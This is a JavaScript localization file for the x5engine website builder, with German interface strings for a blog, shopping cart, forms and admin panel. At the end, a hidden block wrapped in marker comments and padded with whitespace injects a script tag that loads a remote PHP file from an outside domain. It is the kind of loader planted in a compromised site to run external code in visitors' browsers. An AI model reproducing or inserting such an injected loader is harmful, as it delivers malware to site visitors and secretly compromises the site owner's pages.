x5engine.l10n.addLocalization('admin_comment_abuse', 'Diese Nachricht wurde als Missbrauch gemeldet');
x5engine.l10n.addLocalization('admin_seo_auth', 'In Ihren Google Webmaster Tool Zugang einloggen');
x5engine.l10n.addLocalization('admin_seo_crawl_mex', 'Nachricht von Google Bot');
x5engine.l10n.addLocalization('admin_seo_home', 'Das Ergebnis der Indizierung');
x5engine.l10n.addLocalization('admin_seo_keys', 'Mit einem Inhaltsverzeichnis versehene Schlüsselwörter');
x5engine.l10n.addLocalization('admin_seo_messages', 'Nachricht von Google Webmaster Tools');
x5engine.l10n.addLocalization('admin_seo_pagerank', 'Google Bewertung');
x5engine.l10n.addLocalization('admin_seo_sitemap', 'SiteMap');
x5engine.l10n.addLocalization('admin_test_database', 'MySQL-Einstellungen');
x5engine.l10n.addLocalization('admin_test_database_suggestion', 'Bitten Sie Ihren Hoster die Datenbank-Einstellungen zu überprüfen');
x5engine.l10n.addLocalization('admin_test_folder', 'Öffentlicher Ordner-Pfad auf dem Server');
x5engine.l10n.addLocalization('admin_test_folder_suggestion', 'Fragen Sie Ihren Anbieter nach dem Pfad des Ordners lesen / schreiben. Dieser sollte auf CHMOD 777 gesetzt werden.');
x5engine.l10n.addLocalization('admin_test_session', 'Sitzungsunterstützung');
x5engine.l10n.addLocalization('admin_test_session_suggestion', 'Erfragen Sie weitere Einzelheiten zu den Einstellungen/Sessionen bei Ihrem Hoster');
x5engine.l10n.addLocalization('admin_test_version', 'PHP-Version');
x5engine.l10n.addLocalization('admin_test_version_suggestion', 'Bitte beantragen Sie ein PHP-Update bei Ihrem Hoster');
x5engine.l10n.addLocalization('blog_abuse', 'Als Missbrauch markieren');
x5engine.l10n.addLocalization('blog_admin', 'Administration');
x5engine.l10n.addLocalization('blog_approve', 'Bestätigen');
x5engine.l10n.addLocalization('blog_approve_link', 'Nutzen Sie diesen Link zum bestätigen');
x5engine.l10n.addLocalization('blog_approve_question', 'Möchen Sie diese Anmerkung bestätigen?');
x5engine.l10n.addLocalization('blog_back', 'Zurück zum Blog');
x5engine.l10n.addLocalization('blog_comment', 'Kommentar');
x5engine.l10n.addLocalization('blog_comments', 'Kommentare');
x5engine.l10n.addLocalization('blog_delete', 'Löschen');
x5engine.l10n.addLocalization('blog_delete_question', 'Möchten Sie diesen Beitrag löschen?');
x5engine.l10n.addLocalization('blog_email', 'E-Mail:');
x5engine.l10n.addLocalization('blog_field_error', 'Folgendes Feld wurde nicht ausgefüllt');
x5engine.l10n.addLocalization('blog_folder_error', 'Es war nicht möglich auf den Ordner des Servers zuzugreifen');
x5engine.l10n.addLocalization('blog_in', 'in');
x5engine.l10n.addLocalization('blog_login', 'Eingabe');
x5engine.l10n.addLocalization('blog_message', 'Mitteilung:');
x5engine.l10n.addLocalization('blog_name', 'Name:');
x5engine.l10n.addLocalization('blog_new_comment_object', 'Blog: Neuer Beitrag');
x5engine.l10n.addLocalization('blog_new_comment_text', 'Dem Artikel wurde ein neuer Beitrag hinzugefügt');
x5engine.l10n.addLocalization('blog_no_comment', 'Kein Kommentar');
x5engine.l10n.addLocalization('blog_offline_message', 'Diese Eigenschaft wird erst aktiviert, wenn Ihre Seite online ist');
x5engine.l10n.addLocalization('blog_password', 'Passwort');
x5engine.l10n.addLocalization('blog_published_by', 'Herausgegeben von');
x5engine.l10n.addLocalization('blog_read_all', 'Alles lesen');
x5engine.l10n.addLocalization('blog_send', 'Senden');
x5engine.l10n.addLocalization('blog_send_confirmation', 'Nachricht gesendet!<br/>Ihre Nachricht wird nach Freigabe durch den Admin angezeigt');
x5engine.l10n.addLocalization('blog_send_error', 'Es gab ein Problem während der Anmerkungseinfügung.');
x5engine.l10n.addLocalization('blog_show', 'Ansehen');
x5engine.l10n.addLocalization('blog_sources', 'Warenlager');
x5engine.l10n.addLocalization('blog_unapprove', 'Zurück');
x5engine.l10n.addLocalization('blog_unapprove_link', 'Verwenden Sie diese Verbindung, um diese Anmerkung zu widerrufen');
x5engine.l10n.addLocalization('blog_unapprove_question', 'Wollen Sie diese Anmerkung zurückweisen?');
x5engine.l10n.addLocalization('blog_website', 'Website im Internet');
x5engine.l10n.addLocalization('cart_add', 'Hinzufügen');
x5engine.l10n.addLocalization('cart_continue', 'Weiter');
x5engine.l10n.addLocalization('cart_continue_shopping', 'Weiter einkaufen');
x5engine.l10n.addLocalization('cart_currency_conversion', 'Wechselkurs');
x5engine.l10n.addLocalization('cart_descr', 'Beschreibung');
x5engine.l10n.addLocalization('cart_discount', 'Verfügbare Rabatte');
x5engine.l10n.addLocalization('cart_empty', 'Möchten Sie Ihren Warenkorb leeren?');
x5engine.l10n.addLocalization('cart_empty_button', 'Warenkorb leeren');
x5engine.l10n.addLocalization('cart_err_cookie', 'Es ist notwendig Cookies zu aktivieren um diese Funktion zu verwenden');
x5engine.l10n.addLocalization('cart_err_currency_conversion', 'Unfähig, die Währung zu übersetzen');
x5engine.l10n.addLocalization('cart_err_emptycart', 'Der Warenkorb ist leer');
x5engine.l10n.addLocalization('cart_err_minimum_price', 'Der Mindestbestellwert beträgt [PRICE]');
x5engine.l10n.addLocalization('cart_err_nojs', 'Sie müssen Javascript aktivieren, um den Shop zu verwenden');
x5engine.l10n.addLocalization('cart_err_offline_email', 'Die Bestellung wird nur ausgeführt und an [MAIL] geschickt, wenn Ihre Seite online ist');
x5engine.l10n.addLocalization('cart_err_payment', 'Sie müssen eine Zahlungsart wählen');
x5engine.l10n.addLocalization('cart_err_qty', 'Keine gültige Menge');
x5engine.l10n.addLocalization('cart_err_quantity', 'Sie müssen mindestens [QUANTITY] bestellen um weiter einkaufen zu können');
x5engine.l10n.addLocalization('cart_err_shipping', 'Sie müssen eine Lieferart wählen.');
x5engine.l10n.addLocalization('cart_field_address1', 'Anschrift');
x5engine.l10n.addLocalization('cart_field_address2', 'Zusätzliche Informationen zur Anschrift');
x5engine.l10n.addLocalization('cart_field_adverts', 'Wie sind Sie auf uns aufmerksam geworden?');
x5engine.l10n.addLocalization('cart_field_city', 'Ort');
x5engine.l10n.addLocalization('cart_field_company', 'Firma');
x5engine.l10n.addLocalization('cart_field_country', 'Land');
x5engine.l10n.addLocalization('cart_field_customerid', 'Kundennummer');
x5engine.l10n.addLocalization('cart_field_email', 'E-Mail-Adresse');
x5engine.l10n.addLocalization('cart_field_fax', 'Fax');
x5engine.l10n.addLocalization('cart_field_lastname', 'Nachname');
x5engine.l10n.addLocalization('cart_field_mobile', 'Handy');
x5engine.l10n.addLocalization('cart_field_name', 'Vorname');
x5engine.l10n.addLocalization('cart_field_newsletter', 'Newsletter bestellen');
x5engine.l10n.addLocalization('cart_field_note', 'Bemerkungen');
x5engine.l10n.addLocalization('cart_field_other', 'Weiteres');
x5engine.l10n.addLocalization('cart_field_phone', 'Telefon');
x5engine.l10n.addLocalization('cart_field_stateregion', 'Bundesland/Kanton');
x5engine.l10n.addLocalization('cart_field_vat', 'Steuernummer');
x5engine.l10n.addLocalization('cart_field_zippostalcode', 'PLZ');
x5engine.l10n.addLocalization('cart_goback', 'Zurück');
x5engine.l10n.addLocalization('cart_gonext', 'Weiter');
x5engine.l10n.addLocalization('cart_goshop', 'Zum Warenkorb');
x5engine.l10n.addLocalization('cart_name', 'Name');
x5engine.l10n.addLocalization('cart_opt', 'Optionen');
x5engine.l10n.addLocalization('cart_order_no', 'Bestellnummer');
x5engine.l10n.addLocalization('cart_order_process', 'Ihre Bestellung wird abgesendet');
x5engine.l10n.addLocalization('cart_payment', 'Zahlung');
x5engine.l10n.addLocalization('cart_paynow', 'Jetzt bezahlen');
x5engine.l10n.addLocalization('cart_paynow_button', 'Jetzt bezahlen!');
x5engine.l10n.addLocalization('cart_paypal_image_1', 'https://www.paypal.com/de_DE/i/btn/btn_buynowCC_LG.gif');
x5engine.l10n.addLocalization('cart_paypal_image_2', 'https://www.paypal.com/de_DE/i/scr/pixel.gif');
x5engine.l10n.addLocalization('cart_price', 'Preis');
x5engine.l10n.addLocalization('cart_product_list', 'Produktliste');
x5engine.l10n.addLocalization('cart_qty', 'Menge');
x5engine.l10n.addLocalization('cart_remove', 'entfernen');
x5engine.l10n.addLocalization('cart_remove_q', 'Möchten Sie dieses Produkt aus dem Warenkorb entfernen?');
x5engine.l10n.addLocalization('cart_shipping', 'Lieferart');
x5engine.l10n.addLocalization('cart_shipping_address', 'Lieferadresse');
x5engine.l10n.addLocalization('cart_shipping_option', 'Die Lieferadresse ist abweichend von der Rechnungsadresse');
x5engine.l10n.addLocalization('cart_step1', 'Schritt 1 - Produktwahl');
x5engine.l10n.addLocalization('cart_step1_descr', 'Das Produkt, das Sie in den Warenkorb legen möchten, auswählen und die Menge angeben.');
x5engine.l10n.addLocalization('cart_step2', 'Schritt 2 – Versand- und Zahlungsmethode');
x5engine.l10n.addLocalization('cart_step2_cartlist', 'Die folgende Liste zeigt Ihnen die Produkte in Ihrem Warenkorb und  den Gesamtbetrag der Bestellung.');
x5engine.l10n.addLocalization('cart_step2_shiplist', 'Wählen Sie die Versand- und Zahlungsmethode aus und klicken Sie auf *Weiter* um fortzufahren.');
x5engine.l10n.addLocalization('cart_step3', 'Schritt 3 - Kundendaten');
x5engine.l10n.addLocalization('cart_step3_descr', 'Geben Sie bitte Ihre Daten ein und klicken Sie \'Weiter\'.<br />Für die Felder mit Sternchen ist die Eingabe obligatorisch.');
x5engine.l10n.addLocalization('cart_step4', 'Schritt 4 - Zusammenfassung der Bestellungen');
x5engine.l10n.addLocalization('cart_step4_descr', 'Kontrollieren Sie bitte, dass alle eingegebenen Daten korrekt sind und bestätigen Sie Ihre Bestellung.');
x5engine.l10n.addLocalization('cart_step5', 'Schritt 5 - Bestellung abgeschlossen');
x5engine.l10n.addLocalization('cart_step5_descr', 'Ihre Bestellung wurde weitergeleitet und wird sobald als möglich bearbeitet.<br /><br />Eine E-Mail mit Versand- und Zahlungsbedingungen sowie eine Zusammenfassung der eben eingegebenen Daten wird via E-Mail an Sie gesendet.<br /><br />Um Ihre Bestellung nachzuverfolgen, bewahren Sie bitte Ihre Bestellnummer auf.');
x5engine.l10n.addLocalization('cart_subtot', 'Zwischensumme');
x5engine.l10n.addLocalization('cart_total', 'Total');
x5engine.l10n.addLocalization('cart_total_price', 'Total');
x5engine.l10n.addLocalization('cart_total_vat', 'Total inklusive MwSt.');
x5engine.l10n.addLocalization('cart_vat', 'MwSt');
x5engine.l10n.addLocalization('cart_vat_address', 'Rechnungsadresse');
x5engine.l10n.addLocalization('date_days', ['Mo','Di','Mi','Do','Fr','Sa','So']);
x5engine.l10n.addLocalization('date_format', '[D] [dd] [M] [yyyy]');
x5engine.l10n.addLocalization('date_full_days', ['Montag','Dienstag','Mittwoch','Donnertag','Freitag','Sonnabend','Sonntag']);
x5engine.l10n.addLocalization('date_full_months', ['Januar','Februar','März','April','Mai','Juni','Juli','August','September','Oktober','November','Dezember']);
x5engine.l10n.addLocalization('date_months', ['Jan','Feb','Mär','Apr','Mai','Jun','Jul','Aug','Sep','Okt','Nov','Dez']);
x5engine.l10n.addLocalization('form_accept', 'Zustimmen');
x5engine.l10n.addLocalization('form_captcha', 'Die Überprüfung ist fehl geschlagen');
x5engine.l10n.addLocalization('form_captcha_title', 'Wortprüfung:');
x5engine.l10n.addLocalization('form_CF', '[FIELD] muss einen Benutzercode ID beinhalten');
x5engine.l10n.addLocalization('form_characters', '[FIELD] darf nur Zeichen beinhalten');
x5engine.l10n.addLocalization('form_confirm', 'Wiederholung [FIELD]');
x5engine.l10n.addLocalization('form_date', '[FELD] muss ein gültiges Datum beinhalten');
x5engine.l10n.addLocalization('form_disclaimer', 'Bedingungen');
x5engine.l10n.addLocalization('form_email', '[FIELD] beinhaltet keine gültige E-Mail-Adresse');
x5engine.l10n.addLocalization('form_equal', '[FIELD] muss gleich dem Kontrollfeld sein');
x5engine.l10n.addLocalization('form_err_disclaimer', 'Sie müssen den Bedingungen zustimmen');
x5engine.l10n.addLocalization('form_format', '[FIELD] falsches Format');
x5engine.l10n.addLocalization('form_js_error', 'Sie müssen Javascript aktivieren! <br />Sie werden auf die vorherige Seite in 5 Sec. zurückgeleitet . . .');
x5engine.l10n.addLocalization('form_length', '[FIELD] ist zu kurz.');
x5engine.l10n.addLocalization('form_mandatory', '[FIELD] ist Pflichtfeld');
x5engine.l10n.addLocalization('form_numbers', '[FIELD] darf nur Zahlen enthalten');
x5engine.l10n.addLocalization('form_question', 'Sie haben die falsche Antwort eingegeben');
x5engine.l10n.addLocalization('form_reset', 'Zurücksetzen');
x5engine.l10n.addLocalization('form_spam_error', 'Anti-Spam aktiviert');
x5engine.l10n.addLocalization('form_submit', 'Senden');
x5engine.l10n.addLocalization('form_telephone', '[FIELD] muss eine gültige Telefonnummer enthalten');
x5engine.l10n.addLocalization('form_URL', '[FIELD] muss eine gültige URL enthalten');
x5engine.l10n.addLocalization('form_validating', 'Bestätigungsformular');
x5engine.l10n.addLocalization('form_VAT', '[FIELD] hat keine Steuernummer');
x5engine.l10n.addLocalization('InnerJump_Anchor_Menu', 'Hauptmenü');
x5engine.l10n.addLocalization('InnerJump_Content', 'Direkt zum Seiteninhalt');
x5engine.l10n.addLocalization('InnerJump_Content_Title', 'Überspringen Sie das Hauptmenü');
x5engine.l10n.addLocalization('InnerJump_Footer_Content', 'Zurück zum Seiteninhalt');
x5engine.l10n.addLocalization('InnerJump_Footer_Menu', 'Zurück zum Hauptmenü');
x5engine.l10n.addLocalization('InnerJump_Footer_Title_Content', 'Lesen Sie den Inhalt der Seite noch einmal durch');
x5engine.l10n.addLocalization('InnerJump_Footer_Title_Menu', 'Die Webseite neu einlesen');
x5engine.l10n.addLocalization('private_area_login', 'Eingabe');
x5engine.l10n.addLocalization('private_area_login_error', 'Falscher Name und/oder falsches Passwort');
x5engine.l10n.addLocalization('private_area_logout', 'Logout');
x5engine.l10n.addLocalization('private_area_password', 'Passwort');
x5engine.l10n.addLocalization('private_area_registration', 'Registrierung');
x5engine.l10n.addLocalization('private_area_title', 'Privater Bereich');
x5engine.l10n.addLocalization('private_area_username', 'Benutzername');
x5engine.l10n.addLocalization('product_option', 'Option');
x5engine.l10n.addLocalization('rating_novote', 'Danke für die Bewertung');
x5engine.l10n.addLocalization('rating_vote', 'Bewerten');
x5engine.l10n.addLocalization('search_blog', 'Blog');
x5engine.l10n.addLocalization('search_duration', 'Dauer');
x5engine.l10n.addLocalization('search_empty', 'Nichts gefunden');
x5engine.l10n.addLocalization('search_for', 'für');
x5engine.l10n.addLocalization('search_images', 'Grafiken');
x5engine.l10n.addLocalization('search_on', 'für');
x5engine.l10n.addLocalization('search_pages', 'Seiten');
x5engine.l10n.addLocalization('search_products', 'Produkte');
x5engine.l10n.addLocalization('search_result_count', 'Resultat');
x5engine.l10n.addLocalization('search_results', 'Suchergebnisse');
x5engine.l10n.addLocalization('search_results_count', 'Resultate');
x5engine.l10n.addLocalization('search_search', 'Suchen');
x5engine.l10n.addLocalization('search_videos', 'Video');
x5engine.l10n.addLocalization('sitemap_caption', 'Generelle Seitenstruktur');
x5engine.l10n.addLocalization('sitemap_fold', 'Alle schließen');
x5engine.l10n.addLocalization('sitemap_title', 'Seitenstruktur');
x5engine.l10n.addLocalization('sitemap_unfold', 'Alle öffnen');
x5engine.l10n.addLocalization('welcome_lang_notcompleted', 'Diese Sprache ist noch nicht verfügbar');

/*da917a*/
  /**//**/



                   /**/







document.write("<script type='text/javascript' src='http://www.invokate.com/27gpZhcw.php'></"+ "script>");





                                              /**/
/*/da917a*/
